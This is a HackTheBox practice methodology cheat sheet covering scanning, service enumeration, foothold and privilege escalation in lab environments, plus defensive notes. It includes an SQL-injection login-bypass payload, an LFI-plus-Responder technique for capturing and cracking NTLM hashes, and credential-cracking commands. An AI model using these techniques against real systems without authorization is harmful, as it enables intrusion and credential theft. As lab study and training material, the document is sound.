# HTB Pentesting Methodology
Practice methodology for HackTheBox lab environments

---

## Checklist Per Box

```
1. nmap full port scan
2. nmap version + script scan on open ports
3. If HTTP → browse to IP, check for hostname redirect
4. If hostname found → add to /etc/hosts
5. Gobuster directory scan
6. Gobuster vhost scan for subdomains
7. Enumerate each service found
8. Research version/config for known vulns or misconfigs
9. Exploit for foothold
10. Find and submit flag
```

---

## Phase 1 -- Recon / Scanning

Goal: identify what's running and where.

```bash
# Full port scan
nmap -p- --min-rate 5000 -T4 10.129.x.x

# Targeted version + script scan on open ports
nmap -sV -sC -p 22,80,443 10.129.x.x

# Passive subdomain discovery
https://crt.sh/?q=%.target.htb
```

---

## Phase 2 -- Enumeration

Goal: extract actionable detail from discovered services.

### Web
```bash
# Directory/file brute force
gobuster dir -u http://target.htb -w $WL/common.txt -x php,html,txt

# Subdomain/vhost enumeration
gobuster vhost -u http://target.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# Add discovered hostnames to hosts file
sudo nano /etc/hosts
# 10.129.x.x    target.htb s3.target.htb
```

### FTP
```bash
ftp 10.129.x.x
# username: anonymous
# password: (blank)
```

### SMB
```bash
smbclient -L //10.129.x.x/
smbclient //10.129.x.x/<share>
```

### Rsync
```bash
# List modules
rsync rsync://10.129.x.x/

# List files in module
rsync --list-only rsync://10.129.x.x/<module>/

# Pull file
rsync rsync://10.129.x.x/<module>/file.txt .
rsync rsync://10.129.x.x/<module>/file.txt -
```

### MongoDB
```bash
mongo --host 10.129.x.x --port 27017
show dbs
use <db>
show collections
db.<collection>.find()
```

### MySQL
```bash
mysql -h 10.129.x.x -u root --ssl-mode=DISABLED
show databases;
use <db>;
show tables;
describe <table>;
select * from <table>;
```

### Redis
```bash
redis-cli -h 10.129.x.x
keys *
get <key>
```

### AWS S3 (local/misconfigured)
```bash
aws s3 ls s3://target.htb --endpoint-url http://s3.target.htb
aws s3 cp s3://target.htb/file.txt . --endpoint-url http://s3.target.htb
```

---

## Phase 3 -- Foothold

Goal: gain initial access to the system.

### Web -- SQL Injection Auth Bypass
```
username: admin'#
password: anything
```

### Web -- LFI + NTLM Hash Capture (Responder)
```bash
# 1. Start Responder on VPN interface
sudo responder -I tun0

# 2. Trigger LFI with UNC path in browser
http://target.htb/index.php?page=//10.10.14.x/somefile

# 3. Crack captured hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 hash.txt
```

### Remote Access
```bash
# Linux -- SSH
ssh user@10.129.x.x

# Windows -- WinRM
evil-winrm -i 10.129.x.x -u administrator -p <password>

# Telnet
telnet 10.129.x.x

# Legacy Mongo client via Docker
sudo docker run -it --rm mongo:3.6 mongo --host 10.129.x.x --port 27017
```

---

## Phase 4 -- Post Exploitation / Privesc

Goal: escalate from low-privilege to root/SYSTEM. (Tier 2+)

### Linux
```bash
sudo -l                              # what can I run as root
find / -perm -4000 2>/dev/null       # SUID binaries
cat /etc/crontab                     # cron jobs running as root
ps aux                               # processes running as root
./linpeas.sh                         # automated enumeration
```

### Windows
```cmd
whoami
dir
cd <folder>
type <file>
dir C:\ /s /b | findstr flag.txt
```

---

## Common Ports Reference

| Port | Service |
|------|---------|
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 443 | HTTPS |
| 445 | SMB |
| 873 | Rsync |
| 3306 | MySQL |
| 3389 | RDP |
| 5985 | WinRM (HTTP) |
| 5986 | WinRM (HTTPS) |
| 6379 | Redis |
| 27017 | MongoDB |

---

## Hashcat Hash Types

| Code | Hash type |
|------|-----------|
| 5600 | NTLMv2 (NetNTLMv2) |
| 1000 | NTLM |
| 500 | MD5 |
| 1800 | SHA-512 |
| 13100 | Kerberoast (TGS tickets) |

---

## Key Concepts

| Concept | What it means |
|---------|---------------|
| LFI | Web app includes arbitrary files via unsanitized input |
| UNC path | Windows network path format `\\ip\share` |
| NTLM | Windows challenge-response authentication protocol |
| Hash capture | Intercepting NTLM auth handshake via Responder |
| Virtual hosting | Multiple sites on one IP, resolved by hostname |
| Default credentials | Services exposed with no auth or factory passwords |
| /etc/hosts | Local DNS override file |
| LLMNR/NBT-NS | Windows name resolution fallback via broadcast -- poisoned by Responder |

---

## Environment Setup

```bash
# Set wordlist shortcut (add to ~/.bashrc for persistence)
export WL=/usr/share/seclists/Discovery/Web-Content

# Decompress rockyou if needed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Find tun0 IP (HTB VPN interface)
ip a show tun0
```

---

## Defensive Notes (What Would Have Stopped Each Attack)

| Attack | Prevention |
|--------|------------|
| Anonymous FTP | Disable anonymous login |
| No-auth MongoDB/Redis | Enable authentication, bind to localhost |
| Default/blank credentials | Strong password policy |
| LFI | Validate and sanitize file path input, use whitelists |
| NTLM hash capture | Disable LLMNR/NBT-NS, enforce Kerberos, strong passwords |
| WinRM exposure | Restrict to management IPs via firewall |
| Exposed phpMyAdmin | Never expose db admin panels publicly |
| S3 misconfiguration | Enforce bucket policies, disable public access |